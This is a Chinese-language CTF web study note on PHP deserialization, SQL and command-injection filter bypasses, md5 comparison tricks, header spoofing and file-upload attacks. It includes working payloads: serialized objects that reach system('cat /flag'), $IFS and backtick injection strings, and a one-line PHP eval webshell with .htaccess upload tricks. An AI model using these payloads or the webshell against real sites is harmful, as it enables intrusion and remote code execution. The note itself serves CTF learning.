# CTF WEB

## SQL注入

见 CTF WEB SQL

## 反序列化

如何跳过__wakeup函数？

O:6:"HaHaHa":***3***:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}

如上所示 对象本该只有两个属性 admin 和 passwd ，将数量设置为3即可在反序列化中跳过wakeup函数。

例题：

```php
<?php
error_reporting(0);
class dxg
{
   function fmm()
   {
      return "nonono";
   }
}

class lt
{
   public $impo='hi';
   public $md51='weclome';
   public $md52='to NSS';
    
   function __construct()
   {
      $this->impo = new dxg;
   }
   function __wakeup()
   {
       # 此处污染impo属性 需要跳过wakeup
      $this->impo = new dxg;
      return $this->impo->fmm();
   }

   function __toString()
   {
      if (isset($this->impo) && md5($this->md51) == md5($this->md52) && $this->md51 != $this->md52)
          # 此处可以调用impo属性的fmm方法 只用是impo属性为fin对象即可
         return $this->impo->fmm();
   }
   function __destruct()
   {
      echo $this;
   }
}

class fin
{
   public $a;
   public $url = 'https://www.ctfer.vip';
   public $title;
   function fmm()
   {
      $b = $this->a;
      $b($this->title);
   }
}

if (isset($_GET['NSS'])) {
   $Data = unserialize($_GET['NSS']);
} else {
   highlight_file(__file__);
}
```

思路：

先找到能找到能回显flag的点位

此处点位在调用fin类中的fmm方法，只需将$b="system" title="cat /flag" 即可

如何调用fin类中的fmm方法呢？再往上看 可知在lt类中的__toSrting函数会调用fmm方法

我们需要构造一个lt类并将其反序列化即可。



tostring函数可以在echo中被调用

传递值可以考虑使用引用&



**如何构造private属性序列化**

class Name

​	private username

于是我们这样构造pyload:

?select=O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}

然后我们又意识到，这个变量时private

private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字

段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度

于是我们在构造一回pyload:

?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}



## PHP伪协议

https://blog.csdn.net/weixin_51735061/article/details/123156046

如何回显文件？

system(cat /flag)

#### 文件包含

posh不要随便加空格

如何绕过waf？

先利用伪协议查看index.php的编码

找到条件并跳过即可

## 绕过

#### in_array绕过

如若没有第三个参数 则将其看作==即可

#### md5数组绕过

```
if($_POST['wqh']!==$_POST['dsy']&&md5($_POST['wqh'])===md5($_POST['dsy'])){
    echo $FLAG;
} 
```

此时传入两个数组即可，因为数组可以被传入md5，但是会返回NULL。

#### md5弱比较绕过

```php
$first==md5($first)
```

$first=0e215962017

#### 双写绕过

```
$str = preg_replace('/NSSCTF/',"",$_GET['str']);
```

这里屏蔽了NSSCTF 只要我们这样写： NSSNSSCTFCTF 中间的NSSCTF就会被替换，留存下来的字符仍然是NSSCTF。

#### 通配符绕过

```php
if(!preg_match("/\;|\&|\\$|\x09|\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i", $cmd)){
        return($cmd);
    } 

shell_exec($cmd); 
```

此时可以用通配符将flag写入fuck.txt 再直接从url中读取fuck.txt即可

传参：?cmd=cat /f* > fuck.txt、

#### session绕过

[CTF-Web20（涉及简单的cookie与session）_ctf session-CSDN博客](https://blog.csdn.net/weixin_39934520/article/details/108716916)



#### 常见Linux命令绕过

ls绕过(内联执行)

ip=;cat$IFS$9`ls`

 linux下，会先执行反引号下面的语句
 在这里会执行ls,ls的结果是“index.php flag.php”
 所以最后执行的语句等价于
 cat index.php flag.php



- cat过滤   ==> c\at绕过  （可以在linux系统测试，是可以的）
- 空格过滤 ==> ${IFS}绕过
- flag过滤  ==> fl\ag



## XXF

从本地页面跳转使用

X-Forwarded-For: 127.0.0.1

Referer:127.0.0.1

遇到将字符作为语句执行 可以将该字符设置为system("cat /f*")

### RCE(远程代码执行漏洞)

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['url']))
{
eval($_GET['url']);
}
?> 
```

传入url=system("ls");

找到flag后再传入url=system("cat /f*");即可



还可以使用反引号绕过

##### 反引号绕过

ip=;cat$IFS$9`ls`
 原理讲解：
 linux下，会先执行反引号下面的语句
 在这里会执行ls,ls的结果是“index.php flag.php”
 所以最后执行的语句等价于
 cat index.php flag.php
 右键查看页面源码即可得到flag

$IFS$9可用来代替空格

```
代替空格
< 、<>、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等
```

例题：

```php
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag); 
```

 此处cat可以用ca$@t 绕过 空格可以用$IFS绕过

### PUT 请求

put请求需要利用burp抓包再修改

#### 今天天气真好

没有过滤“\”，在shell中反斜杠被当作转义符号处理，对一个字母的转义任然是他本身，故诸如“l\s”会被当作“ls”处理，从而实现绕过；

在php中，被反单引号包裹的字符会被作为shell命令处理，之后利用print函数即可获得输出结果



## 文件上传漏洞

#### php绕过

php3，php5，pht，phtml，phps都是php可运行的文件扩展名



先写个一句话木马

```php
<?php @eval($_POST['hack']); ?>
```

蚁剑连接方式：找到上传文件的路径 密码填hack即可



ph绕过：

先上传.htaccess配置文件 可以使服务器将jpg解析为php

如果上传失败，则使用burp将Content-Type改为image/jpeg等

再上传一句话木马即可

#### 火狐禁用js

可以在网上找到教程

